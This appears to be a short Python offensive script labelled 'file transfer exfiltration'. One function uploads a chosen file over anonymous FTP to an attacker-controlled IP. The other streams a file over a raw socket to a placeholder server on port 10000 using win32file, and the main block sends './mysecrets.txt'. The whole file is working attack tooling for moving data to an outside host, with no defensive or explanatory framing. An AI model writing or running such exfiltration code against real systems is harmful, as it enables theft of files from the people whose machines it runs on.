# file transfer exfiltration

import ftplib
import os
import socket
import win32file

# attacker uses this function to enable ftp server and accept anonymous file uploads.
# docpath = path to file to be sent
# server = ip of attacker to receive
def plain_ftp(docpath, server='<ip>'):

    ftp = ftplib.FTP(server)
    # login in server
    ftp.login("anonymous", "anon@example.com")
    # navigate to target directory
    ftp.cwd('/pub/')
    # write the file to the target directory
    ftp.storbinary("STOR "+ os.path.basename(docpath), open(docpath, "rb"), 1024)
    ftp.quit()

def transmit(document_path):
    client = socket.socket()
    client.connect(('<server_ip', 10000))
    with open(document_path, 'rb') as f:
        win32file.TransmitFile(
                client,
                win32file._get_osfhandle(f.fileno()),
                0, 0, None, 0, b'', b'')

if __name__ == '__main__':
    transmit('./mysecrets.txt')
